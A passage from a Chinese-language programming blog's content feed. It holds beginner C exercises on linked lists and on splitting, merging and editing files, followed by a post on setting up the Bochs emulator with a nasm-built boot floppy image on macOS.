class="line">    <span class="comment">//或者使用for</span></span><br><span class="line">    <span class="keyword">for</span> (头节点; 头节点!=<span class="literal">NULL</span>; 头节点= 头节点-&gt;lpNext)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (头节点-&gt;num == data) &#123;</span><br><span class="line">                <span class="keyword">return</span> 头节点;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 打印环形列表(node* 头节点) &#123;</span><br><span class="line">	node* p = 头节点;</span><br><span class="line">	<span class="keyword">for</span> (p;p-&gt;lpNext != 头节点; p = p-&gt;lpNext)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;数据为:%d, 当前节点地址: %p ,下一个节点地址:% p\n&quot;</span>, p-&gt;num, p, p-&gt;lpNext);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;数据为:%d, 当前节点地址: %p ,下一个节点地址:% p\n&quot;</span>, p-&gt;num, p, p-&gt;lpNext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  判断是否为环形链表(node* 头节点) 	<span class="comment">//使用两个指针 p1 p2  p1速度为2 p1速度为1 在某一时刻会相遇说明是环形链表</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> Flag = <span class="number">0</span>;	<span class="comment">//默认0 不是</span></span><br><span class="line">	node* p1 = <span class="literal">NULL</span>, * p2 = <span class="literal">NULL</span>; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (node *p1 =头节点,*p2=头节点; p1 !=<span class="literal">NULL</span> &amp;&amp; p2!=<span class="literal">NULL</span>; p1=p1-&gt;lpNext,p2=p2-&gt;lpNext)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//p2 快</span></span><br><span class="line">		p2 = p2-&gt;lpNext;</span><br><span class="line">		<span class="keyword">if</span> (p1 == p2) &#123;</span><br><span class="line">			Flag = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="分割合并二进制文件"><a href="#分割合并二进制文件" class="headerlink" title="分割合并二进制文件"></a>分割合并二进制文件</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> path[] = <span class="string">&quot;C:\\Users\\test\\Desktop\\cdemo2.exe&quot;</span>;</span><br><span class="line"><span class="type">char</span>** 路径数组 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件字节数</span></span><br><span class="line"><span class="type">int</span> _getSize(<span class="type">char</span>* path) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);	<span class="comment">//rb 打开二进制文件</span></span><br><span class="line">	<span class="built_in">fseek</span>(p, <span class="number">0</span>, SEEK_END);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> size = <span class="built_in">ftell</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="comment">//printf(&quot;\n原文件大小为:%d\n&quot;,size);</span></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 分割(<span class="type">char</span>* path, <span class="type">int</span> num) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="type">int</span> size = _getSize(path);</span><br><span class="line">	<span class="keyword">if</span> (size % num == <span class="number">0</span>) &#123;  <span class="comment">//字节大小整除</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* 分割后的文件 = <span class="built_in">fopen</span>(路径数组[i],<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; size/num; j++)  &#123;</span><br><span class="line">				<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(p), 分割后的文件);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(分割后的文件);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;		<span class="comment">//不整除  最后一个单独处理</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num<span class="number">-1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* 分割后的文件 = <span class="built_in">fopen</span>(路径数组[i], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; size / (num<span class="number">-1</span>); j++) &#123;</span><br><span class="line">				<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(p), 分割后的文件);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(分割后的文件);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		FILE* 分割后的文件 = <span class="built_in">fopen</span>(路径数组[num<span class="number">-1</span>], <span class="string">&quot;wb&quot;</span>); <span class="comment">//最后一个路径</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size%(num<span class="number">-1</span>); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(p), 分割后的文件);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(分割后的文件);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 合并(<span class="type">char</span> * newpath, <span class="type">int</span> num) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(newpath, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> len = _getSize(路径数组[i]);</span><br><span class="line">		FILE* pp = <span class="built_in">fopen</span>(路径数组[i], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fputc</span>(<span class="built_in">fgetc</span>(pp), p);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(pp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">	路径数组 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>*) * num);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		路径数组[i] = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>) * <span class="number">50</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(路径数组[i], <span class="string">&quot;C:\\Users\\test\\Desktop\\Project%d.exe&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, 路径数组[i]);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	分割(path, num);</span><br><span class="line">	合并(<span class="string">&quot;C:\\Users\\test\\Desktop\\back.exe&quot;</span>, num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(路径数组[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(路径数组);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看目录下文件"><a href="#查看目录下文件" class="headerlink" title="查看目录下文件"></a>查看目录下文件</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> cmd[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">char</span>* path = <span class="string">&quot;C:\\Users\\test\\Desktop&quot;</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(cmd, <span class="string">&quot;dir /b /a:-d \&quot;%s\&quot;&quot;</span>,path);  <span class="comment">//dir /b 仅仅显示文件名 /a:-d 排除目录</span></span><br><span class="line">	<span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h4><h5 id="读取txt并输出"><a href="#读取txt并输出" class="headerlink" title="读取txt并输出"></a>读取txt并输出</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> c[<span class="number">1000</span>];</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">fgets</span>(c, <span class="built_in">sizeof</span>(c), p)!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="分割txt文本"><a href="#分割txt文本" class="headerlink" title="分割txt文本"></a>分割txt文本</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> line = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> path[] = <span class="string">&quot;C:\\Users\\test\\Desktop\\test.txt&quot;</span>;</span><br><span class="line"><span class="type">char</span>** 路径数组 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件字节数</span></span><br><span class="line"><span class="type">int</span> _getSize(<span class="type">char</span>* path) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;r&quot;</span>);	</span><br><span class="line">	<span class="built_in">fseek</span>(p, <span class="number">0</span>, SEEK_END);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> size = <span class="built_in">ftell</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n原文件大小为:%d\n&quot;</span>,size);</span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _getLine() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> c[<span class="number">1000</span>];</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">fgets</span>(c, <span class="built_in">sizeof</span>(c), p) != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;%s&quot;, c);</span></span><br><span class="line">		line++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;总行数为 %d 行\n&quot;</span>,line);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 分割(<span class="type">char</span>* path, <span class="type">int</span> num) &#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (line % num == <span class="number">0</span>) &#123;  <span class="comment">//字节大小整除</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* 分割后的文件 = <span class="built_in">fopen</span>(路径数组[i], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; line / num; j++) &#123;</span><br><span class="line">				<span class="built_in">fputs</span>(<span class="built_in">fgets</span>(str,<span class="built_in">sizeof</span>(str), p), 分割后的文件);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(分割后的文件);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;		<span class="comment">//不整除  最后一个单独处理</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* 分割后的文件 = <span class="built_in">fopen</span>(路径数组[i], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; line / (num - <span class="number">1</span>); j++) &#123;</span><br><span class="line">				<span class="built_in">fputs</span>(<span class="built_in">fgets</span>(str,<span class="built_in">sizeof</span>(str), p), 分割后的文件);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(分割后的文件);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		FILE* 分割后的文件 = <span class="built_in">fopen</span>(路径数组[num - <span class="number">1</span>], <span class="string">&quot;w&quot;</span>); <span class="comment">//最后一个路径</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; line % (num - <span class="number">1</span>); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fputs</span>(<span class="built_in">fgets</span>(str,<span class="built_in">sizeof</span>(str), p), 分割后的文件);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(分割后的文件);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	_getLine();</span><br><span class="line">	<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">	<span class="comment">//53  4  17*3+2</span></span><br><span class="line">	路径数组 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>*) * num);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		路径数组[i] = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>) * <span class="number">50</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(路径数组[i], <span class="string">&quot;C:\\Users\\test\\Desktop\\Text%d.txt&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, 路径数组[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	分割(path, num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(路径数组[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(路径数组);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Text1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="built_in">feof</span>(p)) &#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">fgets</span>(str, <span class="number">255</span>, p);</span><br><span class="line">		<span class="type">char</span>* lpstr = <span class="built_in">strstr</span>(str, <span class="string">&quot;Windows&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (lpstr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	FILE* p2 = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">feof</span>(p)) &#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">fgets</span>(str, <span class="number">255</span>, p);</span><br><span class="line">		<span class="type">char</span>* lpstr = <span class="built_in">strstr</span>(str, <span class="string">&quot;Windows&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (lpstr != <span class="literal">NULL</span>) &#123;  <span class="comment">//找到相关字符进行替换</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">			<span class="built_in">fputs</span>(<span class="string">&quot;Linux&quot;</span>, p2); <span class="comment">//替换为Linux</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fputs</span>(str, p2);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p2);</span><br><span class="line">	<span class="built_in">remove</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">rename</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	FILE* p2 = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">feof</span>(p)) &#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">fgets</span>(str, <span class="number">255</span>, p);</span><br><span class="line">		<span class="type">char</span>* lpstr = <span class="built_in">strstr</span>(str, <span class="string">&quot;Windows&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (lpstr != <span class="literal">NULL</span>) &#123;  <span class="comment">//找到相关字符在其前后插入即可</span></span><br><span class="line">			<span class="comment">//printf(&quot;%s&quot;, str);</span></span><br><span class="line">			<span class="built_in">fputs</span>(<span class="string">&quot;Linux&quot;</span>, p2); </span><br><span class="line">			<span class="built_in">fputs</span>(str, p2);</span><br><span class="line">			<span class="built_in">fputs</span>(<span class="string">&quot;Linux&quot;</span>, p2);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fputs</span>(str, p2);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p2);</span><br><span class="line">	<span class="built_in">remove</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">rename</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>boshs使用</title>
    <url>/posts/156d265c/</url>
    <content><![CDATA[<h3 id="安装bochs和sdl"><a href="#安装bochs和sdl" class="headerlink" title="安装bochs和sdl"></a>安装bochs和sdl</h3><p>brew install bochs</p>
<p>brew install sdl</p>
<h3 id="创建虚拟软盘"><a href="#创建虚拟软盘" class="headerlink" title="创建虚拟软盘"></a>创建虚拟软盘</h3><p>bximage</p>
<p>使用bximage命令直接创建磁盘镜像，选择1创建磁盘 输入fd，表示创建软盘 选择软盘的大小，默认的1.44M就可以了 输入镜像的名称，可以使用默认的镜像名a.img，也可以自定义名称boot.img，只要能跟配置文件中的名称对应即可</p>
<h3 id="编写boot引导程序"><a href="#编写boot引导程序" class="headerlink" title="编写boot引导程序"></a>编写boot引导程序</h3><p>创建一个boot.asm文件 编写代码 此处asm略</p>
<hr>
<h3 id="编译程序-写入软盘"><a href="#编译程序-写入软盘" class="headerlink" title="编译程序 写入软盘"></a>编译程序 写入软盘</h3><p>nasm boot.asm -o boot.bin</p>
<p>编译结束后，将生成的二进制程序boot.bin写入到boot.img中</p>
<p>使用系统自带的dd命令，把Boot程序强制写入到虚拟软盘的固定扇区中</p>
<p>dd if=boot.bin of=boot.img bs=512 count=1 conv=notrunc</p>
<p>if指定输入源文件名，of指定输出文件名，count=1指定传输的块大小为512B，conv=notrunc规定在写入数据后不截断输出文件的尺寸大小。以下为该命令的执行日志信息</p>
<h3 id="配置启动信息"><a href="#配置启动信息" class="headerlink" title="配置启动信息"></a>配置启动信息</h3><p>创建一个bochsrc的配置文件</p>
<p>找到bochs安装目录下的配置路径：/usr/local/Cellar/bochs/2.7/share/doc/bochs/bochsrc-sample.txt （mac下） 关于配置路径问题，标志就是找到bochsrc-sample.txt该文件。不同的电脑、不同的bochs版本可能会有区别。 拷贝bochsrc-sample.txt文件，并重命名为boshsrc（存放在项目目录下），加入如下配置</p>
<p>romimage: file=$BXSHARE/BIOS-bochs-latest  vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest floppya: 1_44=boot.img, status=inserted   # 这里配置为前面生成的.img 不然会找不到设备报错 # 从软盘启动 boot: floppy #输出日志 log: bochsout.txt # 置鼠标不可用 mouse: enabled=0 #键盘配置 keyboard: keymap=#$BXSHARE/keymaps/x11-pc-us.map #内存容量 megs: 32 #使用GUI界面 display_library: sdl2 </p>
<h3 id="启动bochs"><a href="#启动bochs" class="headerlink" title="启动bochs"></a>启动bochs</h3><p>bochs -f bochsrc 选择6</p>
<hr>
<h3 id="出现的问题及解决方式"><a href="#出现的问题及解决方式" class="headerlink" title="出现的问题及解决方式"></a>出现的问题及解决方式</h3><ul>
<li><p>在运行时出现了报错 （Bochs is exiting with the following message: [ ] bochsrc:955: Bochs is not compiled with lowlevel sound support） 查了下是因为在复制原文件后需要将sound和speaker注释掉</p>
</li>
<li><p>Device: [HD ] Message: ata0-0: could not open hard drive image file ‘30M.sample’ 修改配置中的ata0-master type改成none ata0-master: type=none, mode=flat, path=”30M.sample” #ata0-master: type=disk, mode=flat, path=”30M.sample”</p>
</li>
<li><p>Device: [BIOS ] Message: No bootable device. 配置文件中 floppya 设置的.img位置不一致 改成对应的.img即可</p>
</li>
</ul>
<hr>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://juejin.cn/post/7076052275600293918">https://juejin.cn/post/7076052275600293918</a></p>
<p><a href="https://blog.csdn.net/qq_44445809/article/details/123256063">https://blog.csdn.net/qq_44445809/article/details/123256063</a></p>
